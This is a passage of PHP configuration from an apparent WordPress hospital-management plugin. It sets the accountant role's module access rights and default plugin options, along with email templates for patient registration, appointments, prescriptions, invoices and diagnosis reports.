							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										  "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:0,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:0,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:0,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:0,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:0
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									    "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:0,
										 "add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:0,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:0,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:0,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:0
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
							              "menu_title"=>'Diagnosis',
										  "page_link"=>'diagnosis',
										  "own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST['diagnosis_own_data']:1,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:1,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:1,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:1,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:1
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:0,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:1,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:1,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:1,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:1
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										 "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:0,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:0,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:0,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:0,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:0
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									    "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:0,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:0,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:0,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:0,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:0
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										"own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:0,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),
							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										  "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
							              "menu_title"=>'Ambulance',
										  "page_link"=>'ambulance',
										   "own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:0,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:0,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:0,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:0,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:0
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										  "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:0,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:0,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:0,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:0,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:0
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									   "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										 "add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:0,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										 "own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										 "add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
						];
				$role_access_right_accountant = array();
	
				$role_access_right_accountant['accountant'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							           "page_link"=>'doctor',
									   "own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:0,
									   "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						  "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						              "menu_title"=>'Outpatient',
						              "page_link"=>'outpatient',
									  "own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:0,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:0,
									"edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:0,
									"view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									"delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						  ],
									  
							"patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									"own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:0,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:0,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:0,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						  ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:0,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							  ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										  "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:0,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							  ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
							               "menu_title"=>'Pharmacist',
										   "page_link"=>'pharmacist',
										   "own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:0,
										 "add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							  ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										  "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:0,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],
							  
							  
							    "accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
								         "menu_title"=>'Accountant',
										 "page_link"=>'accountant',
										 "own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:1,
										 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
										"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
										"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
										"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										 "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:0,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:0,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:0,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:0
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										  "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0,
										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:0,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:0,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										 "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:0,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:0,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:0,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:0,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:0
							  ],
							  
							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										  "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:0,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:0,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:0,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:0,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:0
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									   "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:0,
										 "add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:0,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:0,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:0,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:0
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
							              "menu_title"=>'Diagnosis',
										  "page_link"=>'diagnosis',
										  "own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST['diagnosis_own_data']:0,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:0,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:0,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:0,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:0
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:0,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:0,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:0,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:0,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:0
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										 "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:0,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:0,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:0,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:0,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:0
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									   "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:1,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:1,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:1,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:1,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:1
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										"own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:0,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										 "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
									  "menu_title"=>'Ambulance',
									  "page_link"=>'ambulance',
										"own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:0,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:0,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:0,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:0,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:0
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										 "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:0,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:0,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:0,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:0,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:0
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									    "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										 "add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:0,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										"own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										 "add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
						];			
		        $options=array("hmgt_hospital_name"=> __( 'Hospital Management System' ,'hospital-mgt'),
					"hmgt_staring_year"=>"2018",
					"hmgt_hospital_address"=>"A 206, Shapath Hexa, Opp. Sola High Court, S G Road, Ahmedabad, Gujarat 380054",
					"hmgt_contact_number"=>"9999999999",
					"hmgt_contry"=>"India",
					"hmgt_email"=>get_option('admin_email'),
					"hmgt_hospital_logo"=>plugins_url( 'hospital-management/assets/images/Thumbnail-img.png' ),
					"hmgt_hospital_background_image"=>plugins_url('hospital-management/assets/images/hospital_background.png' ),
					"hmgt_doctor_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/doctor.png' ),
					"hmgt_patient_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/patient.png' ),
					"hmgt_guardian_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/patient.png' ),
					"hmgt_nurse_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/nurse.png' ),
					"hmgt_support_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/supportstaff.png' ),
					"hmgt_pharmacist_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/pharmacist.png' ),
					"hmgt_laboratorist_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/laboratorystaff.png' ),
					"hmgt_accountant_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/accountant.png' ),
					"hmgt_driver_thumb"=>plugins_url( 'hospital-management/assets/images/useriamge/driver.jpg' ),
				    "hmgt_viewall_patient"=>'yes',
				    "hmgt_enable_change_profile_picture"=>'yes',
				    "hmgt_enable_hospitalname_in_priscription"=>'yes',
					"hmgt_sms_service"=>"",
					"hmgt_sms_service_enable"=> 0,					
					"hmgt_clickatell_sms_service"=>array(),
					"hmgt_twillo_sms_service"=>array(),
					"hospital_enable_notifications" => 'yes',
					"hmgt_currency_code"=>'INR',
					"MJ_hmgt_date_formate"=>'Y-m-d',
										
					"hmgt_access_right_doctor"=>$role_access_right_doctor,				
					"hmgt_access_right_patient"=>$role_access_right_patient,				
					"hmgt_access_right_nurse"=>$role_access_right_nurse,				
					"hmgt_access_right_laboratories"=>$role_access_right_laboratories,				
					"hmgt_access_right_pharmacist"=>$role_access_right_pharmacist,				
					"hmgt_access_right_accountant"=>$role_access_right_accountant,				
					"hmgt_access_right_supportstaff"=>$role_access_right_supportstaff,				
					
					'MJ_hmgt_patient_registration'=>'You are successfully registered at {{Hospital Name}}',
					'MJ_hmgt_registration_email_template'=>'Dear {{Patient Name}},
					
You are successfully registered at {{Hospital Name}}.Your patient id is {{Patient ID}}.and You can sign in using this link {{Login Link}}
		
Regards
{{Hospital Name}}.',

                    'MJ_hmgt_patient_approved_subject'=>'Patient Approved by admin',
					'MJ_hmgt_patient_approved_email_template'=>'Hello {{Patient Name}} ,

You are successfully registered at {{Hospital Name}}. You profile has been approved by admin and You can sign in using this link {{Login Link}} 
 
Regards
{{Hospital Name}}.',

			        'MJ_hmgt_user_registration_subject'=>' You are Added by admin of {{Hospital Name}}',
					'MJ_hmgt_user_registration_email_template'=>'Dear {{UserName}},
					
You are Added by admin in {{Hospital Name}}.Your have been assigned role of {{Role Name}} in {{Hospital Name}}.
	
UserName : {{User_Name}}
Password : {{Password}}
You can sign in using this link {{Login Link}}

Regards
{{Hospital Name}}.',
						   
					'MJ_hmgt_patient_assigned_to_doctor_patient_email_subject'=>' You are assigned to Doctor {{Doctor Name}}',
					'MJ_hmgt_patient_assigned_to_doctor_patient_email_template'=>'Dear {{Patient Name}},
					
You are assigned to Doctor {{Doctor Name}}. Doctor {{Doctor Name}} belongs to {{Department Name}}.
		
Regards
{{Hospital Name}}.',
															   
					'MJ_hmgt_patient_assigned_to_doctor_mail_subject'=>' New patient {{Patient Name}} has been assigned to you',
					'MJ_hmgt_patient_assigned_to_doctor_mail_template'=>'Dear {{Doctor Name}},
       
New patient {{Patient Name}} has been assigned to you.
		
Regards
{{Hospital Name}}.',
									
					'MJ_hmgt_patient_assigned_to_nurse_subject'=>'You have been assigned new patient {{Patient Name}} ',
					'MJ_hmgt_patient_assigned_to_nurse_template'=>'Dear {{Nurse Name}},
					
You have been assigned new patient {{Patient Name}} .
		
Regards From
{{Hospital Name}}.',
									 
					'MJ_hmgt_appointment_booking_patient_mail_subject'=>'Your appointment successfully booked with Doctor {{Doctor Name}} at {{Appointment Time}} on {{Appointment Date}} ',
					'MJ_hmgt_appointment_booking_patient_mail_template'=>'Dear {{Patient Name}},
					
Your appointment successfully booked with Doctor {{Doctor Name}}.Your appointment is schedule for {{Appointment Time}} on {{Appointment Date}}.

Regards
{{Hospital Name}}.',
								
					'MJ_hmgt_appointment_booking_doctor_mail_subject'=>'New Appointment with Patient {{Patient Name}} at {{Appointment Time}} on {{Appointment Date}} ',
					'Appointment_Booking_doctor_mail_template'=>'Dear {{Doctor Name}}, 
       
New Appointment with Patient {{Patient Name}} has been schedule for {{Appointment Time}} on {{Appointment Date}}. 
		
Regards
{{Hospital Name}}.',
						   
						   'MJ_hmgt_add_prescription_subject'=>'Doctor {{Doctor Name}} has created  new prescription for you',
					       'MJ_hmgt_add_prescription_template'=>'Dear {{Patient Name}},
							
Your Doctor {{Doctor Name}} has created  new prescription for you. We have attached your prescription with this email. So You can download prescription. 

Regards
{{Hospital Name}}.',
							 
							 'MJ_hmgt_payment_received_invoice_subject'=>'Your have successfully paid your invoice {{InvoiceNo}} ',
					          'MJ_hmgt_payment_received_invoice_template'=>'Dear {{Patient Name}},
							  
Your have successfully paid your invoice {{InvoiceNo}}. You can check the invoice attached here.
		
Regards
{{Hospital Name}}.',
							
						   'MJ_hmgt_generate_invoice_subject'=>' Your have a new invoice from {{Hospital Name}} ',
					       'MJ_hmgt_generate_invoice_template'=>'Dear {{Patient Name}},
						   
Your have a new invoice.  You can check the invoice attached here.
		
Regards
{{Hospital Name}}.',
						
						'MJ_hmgt_assign_bed_patient_subject'=>'You have assigned bed number {{Bed ID}} of {{Bed Category}} ',
					    'MJ_hmgt_assign_bed_patient_template'=>'Dear {{Patient Name}},
						
You have assigned bed number {{Bed ID}} of {{Bed Category}} . {{Charges Amount}} will be charged to you for the same. 
 
Regards
{{Hospital Name}}.',
								  
								  'MJ_hmgt_message_received_subject'=>'You have received new message from {{Sender Name}} at {{Hospital Name}} ',
					       'MJ_hmgt_message_received_template'=>'Dear {{Receiver Name}},
						   
You have received new message from {{Sender Name}}. {{Message Content}} . {{Message_Link}}
		
Regards
{{Hospital Name}}.',

								  'MJ_hmgt_add_diagnosis_report_subject'=>'Your have a new diagnosis report from {{Hospital Name}}.',
					       'MJ_hmgt_add_diagnosis_report_template'=>'Dear {{Patient Name}},

Your have a new diagnosis report. {{Charges Amount}} will be charged to you for the diagnosis report.  

You can check the diagnosis report attached here.
     
Regards                                                                                                                                                                                                                          
{{Hospital Name}}.',

								  'MJ_hmgt_add_diagnosis_report_subject_doctor'=>'Diagnosis report for {{Patient Name}}, from {{Hospital Name}} is available for your review.',
					       'MJ_hmgt_add_diagnosis_report_template_doctor'=>'Dear {{Doctor Name}},

Your have a Your have a new diagnosis report for Patient {{Patient Name}}. 
  
You can check the diagnosis report attached here.
     
Regards                                                                                                                                                                                                                        
{{Hospital Name}}.',


								  'MJ_hmgt_cancel_appointment_doctor_subject'=>'Your appointments have been canceled with Patient {{Patient Name}} on {{Appointment Date}} by {{Appointment Time}}.',
					       'MJ_hmgt_cancel_appointment_doctor_mail'=>'Dear {{Doctor Name}} ,
						   
 Your appointments have been canceled with Patient {{Patient Name}}.  

The Appointment was scheduled for {{Appointment Date}} by {{Appointment Time}}.
     
Regards                                                                                                                                                                                                                          
{{Hospital Name}} .',

								  'MJ_hmgt_cancel_appointment_patient_subject'=>'Your appointments have been canceled with Doctor {{Doctor Name}} on {{Appointment Date}} by {{Appointment Time}}.',
					       'MJ_hmgt_cancel_appointment_patient_mail'=>'Dear {{Patient Name}},

Your appointments have been canceled with Doctor {{Doctor Name}} . 

Your appointment was scheduled for {{Appointment Date}} by {{Appointment Time}}.
     
Regards                                                                                                                                                                                                                          
{{Hospital Name}} .',

